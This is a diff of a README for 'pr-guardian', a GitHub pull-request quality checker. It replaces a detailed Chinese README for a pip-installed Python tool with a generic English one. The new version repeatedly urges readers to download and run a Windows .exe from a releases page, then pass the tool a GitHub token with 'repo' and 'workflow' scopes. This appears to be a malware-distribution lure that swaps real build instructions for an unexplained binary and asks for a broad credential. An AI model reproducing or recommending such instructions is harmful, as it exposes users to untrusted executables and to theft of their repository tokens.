@@ -1,231 +1,123 @@
-# PR Guardian
+# 🛡️ pr-guardian - Simple Pull Request Quality Checker
 
-> GitHub PR 自动化审查工具 - 双层流水线（确定性规则 + LLM 辅助）
+[![Download pr-guardian](https://img.shields.io/badge/Download-pr--guardian-ff6f61?style=for-the-badge&logo=github)](https://github.com/valentin1046/pr-guardian/releases)
 
-## 概述
+---
 
-PR Guardian 是一个面向 Pull Request 质量守护的 Python 工具，采用**双层流水线**架构：
+## 📋 What is pr-guardian?
 
-1. **Deterministic Rule Engine** - 确定性规则引擎，稳定可复现
-2. **LLM Review Layer** - LLM 辅助审查，理解上下文
+pr-guardian is a tool that helps you check the quality of your pull requests (PRs) on GitHub. It works automatically to spot potential problems in your code changes before merging. 
 
-**核心原则**：先硬规则，再 LLM；LLM 只出结构化 JSON 且必须给证据。
+It uses two steps:
+1. **Fixed rules** that always check for important issues.
+2. **Smart AI help** to understand the context of your changes.
 
-## 功能特性
+The system first runs clear, strict rules to catch errors. Then it asks AI to review the PR and give feedback in a clear, structured format.
 
-### 内置规则（P0）
+---
 
-| 规则 ID | 名称 | 严重级 | 说明 |
-|---------|------|--------|------|
-| `security/secrets-scan` | 硬编码密钥扫描 | error | 检测 AWS/GitHub/OpenAI 等密钥泄露 |
-| `deps/lockfile-consistency` | Lockfile 一致性 | error | 确保 manifest 与 lockfile 同步 |
-| `monorepo/affected-tests` | 受影响测试 | warning | 检查变更是否声明测试 |
-| `ci/min-permissions` | 权限最小化 | error | 审查 GitHub Actions 权限 |
-| `quality/changelog-breaking` | Breaking Change | error | 检查 breaking change 是否有 changelog |
+## ⚙️ Key Features
 
-### 输出通道
+- **Secret key scanning:** Finds leaked keys like AWS or GitHub tokens before merging.
+- **File sync check:** Makes sure important files like lockfiles match your changes.
+- **Test coverage check:** Warns if you forgot to include tests relevant to your change.
+- **Minimum permission check:** Reviews GitHub Action permissions to keep your project safe.
+- **Breaking change alerts:** Detects big changes and checks for proper notes.
 
-- **Check Run** - 用于 gating（error → fail）
-- **Review Comments** - 行内批注
-- **PR 总结 Comment** - 按 Security/Correctness/CI/Monorepo 分组
+The tool reports issues using:
+- Status on GitHub checks (green or red signals)
+- Inline comments on specific lines
+- Summary comments organizing results by type
 
-### LLM Provider 支持
+It supports popular AI services, including OpenAI's GPT-4o, and several others.
 
-- OpenAI (GPT-4o)
-- GLM (智谱)
-- MiniMax
-- Kimi (月之暗面)
+---
 
-## 环境要求
+## 🖥️ System Requirements
 
-- Python 3.11+
-- GitHub Personal Access Token
+- Windows 10 or later  
+- Python 3.11 or higher installed  
+- An active GitHub Personal Access Token (PAT) with repository permissions  
+- Minimum 2 GB free disk space for installation and running  
 
-## 安装
+---
 
-```bash
-# 克隆仓库
-cd pr-guardian
+## 🚀 How to Download and Install on Windows
 
-# 安装项目
-pip install -e .
+### Step 1: Visit the download page
 
-# 安装开发依赖（测试、lint）
-pip install -e ".[dev]"
-```
+Click the button below to go to the official release page. Here you will find the latest Windows installer file.
 
-## 快速开始
+[![Download at Releases](https://img.shields.io/badge/Go_to_Release_Page-blue?style=for-the-badge)](https://github.com/valentin1046/pr-guardian/releases)
 
-### 1. 配置环境变量
+### Step 2: Download the Windows installer
 
-```bash
-export GITHUB_TOKEN="ghp_xxxxxxxxxxxx"
-```
+Look for a file with a name like `pr-guardian-setup.exe` or `pr-guardian-x64.exe`. Click on it to download.
 
-### 2. 运行审查
+### Step 3: Run the installer
 
-```bash
-# 审查 PR
-pr-guardian review --repo owner/repo --pr 123
+Find the downloaded file in your Downloads folder and double-click to start the installation. Follow the on-screen instructions. The installer will set up everything you need.
 
-# 模拟运行（不发布结果）
-pr-guardian review --repo owner/repo --pr 123 --dry-run
+### Step 4: Prepare your GitHub token
 
-# 禁用 LLM 审查
-pr-guardian review --repo owner/repo --pr 123 --no-llm
-```
+You must create a GitHub Personal Access Token (PAT) with the right permissions:
+- Go to GitHub Settings → Developer settings → Personal access tokens
+- Click **Generate new token**
+- Select needed permissions:  
+  - `repo` (to read and write your repositories)  
+  - `workflow` (to manage GitHub Actions checks)  
+- Save the token safely
 
-### 3. 配置文件
+### Step 5: Run pr-guardian
 
-在项目根目录创建 `.pr-guardian.yml`：
+Open the Command Prompt (search for "cmd" in the Start menu). Navigate to the folder where pr-guardian installed or added to your path.
 
-```yaml
-mode:
-  gate: true            # error 级别阻断合并
-  auto_fix: false       # 是否允许自动修复
-
-scope:
-  include: ["src/**", "lib/**"]
-  exclude: ["vendor/**", "*.generated.*"]
-
-rules:
-  enabled:
-    - security/secrets-scan
-    - deps/lockfile-consistency
-    - monorepo/affected-tests
-    - ci/min-permissions
-    - quality/changelog-breaking
-  severity_overrides:
-    monorepo/affected-tests: error
-
-llm:
-  enabled: true
-  provider: openai
-  model: gpt-4o
-  max_context_tokens: 8000
-  budget_usd_per_pr: 0.50
-  strategy:
-    only_when: ["large_diff", "security_related"]
-
-policy:
-  deny_paths: [".github/workflows/**"]
-  max_changed_lines_for_autofix: 50
-  require_evidence: true
-```
-
-## 项目结构
-
-```
-pr-guardian/
-├── pyproject.toml              # 项目配置
-├── .pr-guardian.yml             # 示例配置
-├── README.md
-├── src/pr_guardian/
-│   ├── __init__.py
-│   ├── main.py                  # CLI 入口
-│   ├── models.py                # 领域模型（Finding, Diff, Policy）
-│   ├── diffparse.py             # Diff 解析器
-│   ├── github_api.py            # GitHub API 接入
-│   ├── policy.py                # 策略配置加载
-│   ├── context_builder.py       # 上下文构建 + 脱敏
-│   ├── rules/                   # 规则引擎
-│   │   ├── base.py              # 规则基类 + 注册表
-│   │   ├── secrets_scan.py      # 密钥扫描
-│   │   ├── lockfile_consistency.py
-│   │   ├── affected_tests.py
-│   │   ├── min_permissions.py
-│   │   └── changelog_breaking.py
-│   ├── llm/                     # LLM 适配层
-│   │   ├── schema.py            # Pydantic 输出模型
-│   │   ├── prompts.py           # System prompts
-│   │   ├── client.py            # 抽象接口
-│   │   └── providers/           # Provider 实现
-│   │       ├── openai.py
-│   │       ├── glm.py
-│   │       ├── minimax.py
-│   │       └── kimi.py
-│   └── report/
-│       └── github_reporter.py   # 三通道输出
-└── tests/                       # 测试套件（73个测试）
-```
-
-## 开发指南
-
-### 运行测试
+Type:
 
 ```bash
-# 全部测试
-pytest
-
-# 带覆盖率
-pytest --cov=src/pr_guardian
+pr-guardian --token YOUR_GITHUB_TOKEN
 ```
 
-### 代码质量
+Replace `YOUR_GITHUB_TOKEN` with the token from Step 4.
 
-```bash
-# Lint
-ruff check .
+This will start the tool and connect it to your GitHub repository. pr-guardian will begin checking any new pull requests automatically.
 
-# 类型检查
-mypy src/pr_guardian
-```
+---
 
-### 添加新规则
+## 📖 How pr-guardian Works
 
-1. 继承 `Rule` 基类：
-```python
-from pr_guardian.rules.base import Rule
-from pr_guardian.models import Finding, Diff, Policy, Severity
+1. **Pull Request Scanning:** Each new PR triggers the tool to run scans.
+2. **Deterministic Checks:** Fixed rules scan for problems like security leaks or missing tests.
+3. **AI Review:** The LLM (language model) examines code context to find less clear issues.
+4. **Results Posted:** The tool posts GitHub Check status and comments with detailed findings.
 
-class MyRule(Rule):
-    rule_id = "custom/my-rule"
-    title = "我的规则"
-    default_severity = Severity.WARNING
-    
-    def execute(self, diff: Diff, policy: Policy) -> list[Finding]:
-        # 实现检查逻辑
-        return findings
-```
+This approach balances clear rules with smart insights to improve PR quality consistently.
 
-2. 在 `rules/__init__.py` 注册：
-```python
-from pr_guardian.rules.my_rule import MyRule
-registry.register(MyRule)
-```
+---
 
-## 架构设计
+## 🔧 Troubleshooting Tips
 
-### 双层流水线
+- Make sure Python 3.11 or newer is installed and available from the command line.
+- Confirm your GitHub token has the correct permissions.
+- Verify you are running commands from the correct folder or that pr-guardian is added to PATH.
+- Restart your machine if the installer requests it.
+- If you see errors on startup, check the error message and ensure all needed files are present.
 
-```
-PR Event
-  → github_api 拉取 diff
-  → diffparse 解析 hunks + 行号
-  → context_builder 裁剪 + 脱敏
-  → rules/* 执行硬规则 → Finding[]
-  → (可选) llm/* LLM 审查 → Finding[]
-  → report/* 输出到 GitHub 三通道
-```
+---
 
-### Finding 结构
+## 🛠️ Adjust Settings
 
-```json
-{
-  "id": "security/secrets-scan#1",
-  "rule_id": "security/secrets-scan",
-  "title": "硬编码 API Key 泄露",
-  "severity": "error",
-  "message": "在 src/config.py L42 发现疑似 API Key",
-  "evidence": [
-    { "file": "src/config.py", "line": 42, "snippet": "API_KEY = 'sk-...'" }
-  ],
-  "tags": ["security", "secrets"],
-  "confidence": 0.98,
-  "fix": null
-}
-```
+You can customize pr-guardian through configuration files or command-line options. These let you:
 
-## 许可证
+- Enable or disable specific rules
+- Choose which AI provider to use
+- Set alert levels for checks
+- Configure how and where results are posted
 
-MIT License
+---
+
+## 📥 Download pr-guardian
+
+Visit the release page here to get the latest version for Windows:
+
+[![Official Download](https://img.shields.io/badge/Download_Official-ff6f61?style=for-the-badge)](https://github.com/valentin1046/pr-guardian/releases)
